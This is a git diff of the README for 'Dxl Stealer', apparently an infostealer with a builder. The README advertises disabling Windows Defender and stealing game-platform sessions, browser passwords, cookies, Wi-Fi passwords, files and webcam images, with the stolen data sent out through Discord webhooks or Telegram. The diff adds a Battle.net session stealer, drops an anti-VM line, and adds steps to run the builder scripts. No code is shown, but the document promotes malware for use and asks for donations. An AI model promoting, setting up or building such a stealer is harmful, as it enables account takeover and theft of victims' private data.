@@ -69,8 +69,8 @@ Dxl
     • Custom Icon.
     • Runs On Startup.
     • Disables Windows Defender.
-    • Anti-VM.
-    • Blocks AV-Related Sites.
+    
+  
     • Melt Stub.
     • Fake Error.
     • EXE Binder.
@@ -81,6 +81,7 @@ Dxl
     • Steals Steam Session.
     • Steals Epic Session.
     • Steals Uplay Session.
+    • Steals Battle.net Session
     • Steals Passwords From Many Browsers.
     • Steals Cookies From Many Browsers.
     • Steals History From Many Browsers.
@@ -93,7 +94,7 @@ Dxl
     • Steals IP Information.
     • Steals System Info.
     • Steals Saved Wifi Passwords.
-    • Steals Common Files.
+    • File Grabber By dxl.
     • Captures Screenshot.
     • Captures Webcam Image.
     • Sends All Data Through Discord Webhooks/Telegram Bot.
@@ -105,7 +106,7 @@ Dxl
 <img src="https://github.com/ghatolow/Dxl-Stealer/blob/main/Screenshots/igt3sajg.jpeg"Application Screenshot">
 <img src="https://github.com/ghatolow/Dxl-Stealer/blob/main/Screenshots/dm1zrMc0.jpeg" alt="Application Screenshot">
 <img src="https://github.com/ghatolow/Dxl-Stealer/blob/main/Screenshots/bDhexYag.jpg" alt="Application Screenshot">
-
+<img src="https://github.com/ghatolow/Dxl-Stealer/blob/main/Screenshots/vyMyZNS9.jpg" alt="Application Screenshot">
 ## Stub Settings
 
 | Option | Description |
@@ -143,6 +144,8 @@ Dxl
 1. Download Python Python version 3.13.0.
 2. Setup  İnstall launcher click  Add to path click.
 3. Dowload Dxl Stealer.
+4. Click Dxl clipper builder.
+5. Double click install.py and Builder.py run.
 ## Support the Project
 
 If you find this project useful and would like to show your support, you can make a donation using the following cryptocurrencies:
